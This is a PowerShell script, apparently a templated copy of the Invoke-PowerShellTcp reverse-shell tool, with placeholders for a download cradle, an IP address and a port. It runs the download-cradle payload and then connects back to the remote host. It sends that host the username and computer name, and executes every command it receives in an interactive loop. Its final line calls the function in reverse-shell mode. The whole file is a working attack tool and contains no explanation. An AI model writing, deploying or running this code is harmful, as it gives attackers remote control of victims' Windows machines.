$DL_CRADLE = @'
{{dl_cradle}}
'@

function Invoke-PowerShellTcp
{

    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    #Connect back if the reverse switch is used.
    if ($Reverse)
    {
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
    }

    #Bind to the provided port if Bind switch is used.
    if ($Bind)
    {
        $listener = [System.Net.Sockets.TcpListener]$Port
        $listener.start()
        $client = $listener.AcceptTcpClient()
    }

    $stream = $client.GetStream()
    [byte[]]$bytes = 0..255|%{0}

    #Create PowerShell object
    $PowerShell = [powershell]::Create()
    # $DL_CRADLE -split ';' | % {
    #     write-host $_
    #     [void]$PowerShell.AddScript($_)
    #     $init = ( $PowerShell.Invoke() | Out-String )
    # }
    [void]$PowerShell.AddScript($DL_CRADLE)
    $init = ( $PowerShell.Invoke() | Out-String )

    #Send back current username and computername
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`n`n" + $init)
    $stream.Write($sendbytes,0,$sendbytes.Length)

    #Show an interactive PowerShell prompt
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $stream.Write($sendbytes,0,$sendbytes.Length)

    $error.clear()
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)

        #Execute the command on the target.
        # $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
        [void]$PowerShell.AddScript($data)
        $sendback = ( $PowerShell.Invoke() | Out-String )


        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        #Return the results
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
    $listener.Stop()
}


Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse
